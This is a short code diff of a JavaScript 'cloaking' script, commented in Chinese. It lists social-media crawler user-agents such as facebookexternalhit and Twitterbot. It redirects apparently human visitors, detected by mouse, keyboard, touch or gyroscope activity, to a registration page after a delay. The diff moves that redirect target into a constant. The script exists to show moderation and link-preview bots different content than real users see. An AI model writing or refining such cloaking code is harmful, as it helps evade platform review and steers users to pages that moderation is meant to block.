@@ -30,7 +30,7 @@
 
 <script>
 // === Cloaking 配置 ===
-const REG_PAGE = "https://your-reg-page.com"; // 真实用户跳转地址
+const REG_PAGE =  "https://google.com"; // 真实用户跳转地址
 const DELAY_MS = 5000; // 延迟跳转时间（毫秒）
 const BOT_UA = [
   "facebookexternalhit","Facebot","Twitterbot","Slackbot",
@@ -78,12 +78,12 @@ setTimeout(() => {
     if (isMobile()) {
       // 移动端逻辑：触摸 + 陀螺仪
       if (userActive && hasGyro) {
-        window.location.href = "https://google.com";
+        window.location.href = REG_PAGE;
       }
     } else {
       // 桌面端逻辑：鼠标/键盘交互
       if (userActive) {
-        window.location.href = "https://google.com";
+        window.location.href = REG_PAGE;
       }
     }
   } else {
